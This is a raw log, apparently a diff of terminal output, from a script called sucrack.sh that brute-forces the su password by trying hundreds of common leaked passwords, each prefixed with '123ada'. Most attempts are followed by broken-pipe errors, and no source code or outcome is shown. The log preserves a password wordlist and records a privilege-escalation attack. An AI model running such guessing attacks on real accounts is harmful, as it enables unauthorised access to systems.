+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamidnight
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adavincent
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adachristine
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaapples
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adascorpio
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajordan23
+Trying password: 123adalorena
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaandreea
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamercedes
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakatherine
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacharmed
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaabigail
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adarafael
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaicecream
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamexico
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabrianna
+Trying password: 123adanirvana
+Trying password: 123adaaaliyah
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapookie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajohncena
+Trying password: 123adalovelove
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafucker
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaabcdef
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabenjamin
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada131313
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagangsta
+Trying password: 123adabrooke
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada333333
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahiphop
+[KTrying password: 123adaaaaaaa
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamybaby
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasergio
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adawelcome
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adametallica
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajulian
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adatravis
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamyspace1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adababyblue
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasabrina
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamichael1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajeffrey
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adastephen
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalove
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadakota
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacatherine
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabadboy
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafernanda
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adawestlife
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adablondie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasasuke
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasmiley
+Trying password: 123adajackson
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasimple
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamelanie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasteaua
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadolphins
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaroberto
+[KTrying password: 123adafluffy
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adateresa
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapiglet
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaronald
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaslideshow
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaasdfghjkl
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaminnie
+[KTrying password: 123adanewyork
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajason
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaraymond
+Trying password: 123adasantiago
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajayson
+./sucrack.sh: line 31: echo: write error: Broken pipe
+[KTrying password: 123ada88888888
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada5201314
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajerome
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagandako
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamuffin
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagatita
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adababyko
+Trying password: 123ada246810
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasweetheart
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adachivas
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaladybug
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakitty
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapopcorn
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaalberto
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adavaleria
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacookies
+Trying password: 123adaleslie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajenny
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adanicole1
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada12345678910
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaleonardo
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajayjay
+[KTrying password: 123adaliliana
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadexter
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasexygirl
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada232323
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaamores
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adarockon
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adachrist
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adababydoll
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaanthony1
+[KTrying password: 123adamarcus
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabitch1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafatima
+Trying password: 123adamiamor
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalover
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adachris1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasingle
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaeeyore
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalalala
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada252525
+./sucrack.sh: line 31: echo: write error: Broken pipe
+[KTrying password: 123adascooter
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adanatasha
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaskittles
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabrooklyn
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacolombia
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada159357
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adateddybear
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adawinnie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahappy
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamanutd
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada123456a
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabritney
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakatrina
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adachristina
+./sucrack.sh: line 31: echo: write error: Broken pipe
+[KTrying password: 123adapasaway
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacocacola
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamahal
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagrace
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalinda
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaalbert
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adatatiana
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalondon
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacantik
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada0123456
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalakers
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamarie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adateiubesc
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada147258369
+Trying password: 123adacharlotte
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adanatalia
+./sucrack.sh: line 31: echo: write error: Broken pipe[K./sucrack.sh: line 31: echo: write error: Broken pipe[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafrancisco
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaamorcito
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasmile
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapaola
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaangelito
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamanchester
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahahaha
+Trying password: 123adaelephant
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamommy1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adashelby
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada147258
+[KTrying password: 123adakelsey
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagenesis
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaamigos
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasnickers
+Trying password: 123adaxavier
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaturtle
+Trying password: 123adamarlon
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalinkinpark
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaclaire
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adastupid
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada147852
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamarina
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagarcia
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafuckyou1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadiego
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabrandy
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaletmein
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahockey
+[KTrying password: 123ada444444
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasharon
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabonnie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaspider
+[KTrying password: 123adaiverson
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaandrei
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajustine
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafrankie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapimpin
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadisney
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adarabbit
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada54321
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafashion
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasoccer1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adared123
+Trying password: 123adabestfriend
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaengland
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahermosa
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada456123
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaqazwsx
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabandit
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadanny
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaallison
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaemily
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada102030
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalucky1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasporting
+Trying password: 123adamiranda
+./sucrack.sh: line 31: echo: write error: Broken pipe
+[KTrying password: 123adadallas
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahearts
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacamille
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adawilson
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapotter
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapumpkin
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adailoveu2
+Trying password: 123adanumber1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakatie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaguitar
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada212121
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adatruelove
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajayden
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasavannah
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahottie1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaphoenix
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamonster
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaplayer
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaganda
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapeople
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adascotland
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adanelson
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajasmin
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaonelove
+Trying password: 123adailovehim
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adashakira
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaestrellita
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabubble
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasmiles
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabrandon1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasparky
+Trying password: 123adabarney
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasweets
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaparola
+[KTrying password: 123adaevelyn
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafamilia
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalove12
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adanikki
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamotorola
+Trying password: 123adaflorida
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaomarion
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamonkeys
+./sucrack.sh: line 31: echo: write error: Broken pipe
+[KTrying password: 123adaloverboy
+Trying password: 123adaelijah
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajoanna
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacanada
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaronnie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamamita
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaemmanuel
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adathunder
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada999999999[KTrying password: 123ada999999999[KTrying password: 123ada999999999
+Trying password: 123adabroken
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adarodrigo
+[KTrying password: 123adamaryjane
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adawestside
+Trying password: 123adacalifornia
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalucky
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamauricio
+[KTrying password: 123adayankees
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajackass
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajamaica
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajustin1
+Trying password: 123adaamigas
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapreciosa
+Trying password: 123adashopping
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaflores
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamariah
+./sucrack.sh: line 31: echo: write error: Broken pipe
+[KTrying password: 123adamatrix
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaisabella
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adatennis
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adatrinity
+./sucrack.sh: line 31: echo: write error: Broken pipe
+[KTrying password: 123adajorge
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasunflower
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakathleen
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabradley
+Trying password: 123adacupcake
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahector
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamartinez
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaelaine
+[KTrying password: 123adarobbie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafriendster
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacheche
+[KTrying password: 123adagracie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaconnor
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahello1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adavalentina
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamelody
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadarling
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasammy
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajamie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasantos
+Trying password: 123adaabcdefg
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajoanne
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacandy
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafuckyou2
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaloser
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadominic
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapebbles
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasunshine1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaswimming
+Trying password: 123adamillie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaloving
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagangster
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adablessed
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacompaq
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adataurus
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagloria
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adatyler
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaaaron
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadarkangel
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakitkat
+Trying password: 123adamegan
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadreams
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasweetpea
+./sucrack.sh: line 31: echo: write error: Broken pipe
+[KTrying password: 123adabettyboop
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajessica1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacynthia
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacheyenne
+Trying password: 123adaferrari
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadustin
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaiubire
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaa123456
+./sucrack.sh: line 31: echo: write error: Broken pipe[K./sucrack.sh: line 31: echo: write error: Broken pipe[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasnowball
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapurple1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaviolet
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadarren
+Trying password: 123adastarwars
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabestfriends
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adainlove
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakelly
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabatista
+Trying password: 123adakarla
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasophia
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adachacha
+Trying password: 123adabiteme
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamarian
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasydney
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasexyme
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapogiako
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagerald
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajordan1
+Trying password: 123ada010203
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadaddy1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adazachary
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadaddysgirl
+[KTrying password: 123adabillabong
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacarebear
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafroggy
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapinky
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaerika
+[KTrying password: 123adaoscar
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaskater
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaraiders
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adanenita
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adatigger1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaashley1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacharlie1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagatito
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalokita
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamaldita
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabuttercup
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adanichole
+Trying password: 123adabambam
+[KTrying password: 123adanothing
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaglitter
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabella
+Trying password: 123adaamber
+./sucrack.sh: line 31: echo: write error: Broken pipe
+[KTrying password: 123adaapple
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada123789
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasister
+Trying password: 123adazacefron
+[KTrying password: 123adatokiohotel
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaloveya
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalindsey
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamoney
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalovebug
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabubblegum
+Trying password: 123adamarissa
+[KTrying password: 123adadreamer
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadarkness
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacecilia
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalollypop
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adanicolas
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagoogle
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalindsay
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacooper
+Trying password: 123adapassion
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakristine
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagreen
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapuppies
+[KTrying password: 123adaariana
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafuckme
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adachubby
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaraquel
+Trying password: 123adalonely
+[KTrying password: 123adaanderson
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasammie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasexybitch
+Trying password: 123adamario
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabutter
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adawillow
+Trying password: 123adaroxana
+Trying password: 123adamememe
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacaroline
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasusana
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakristen
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaballer
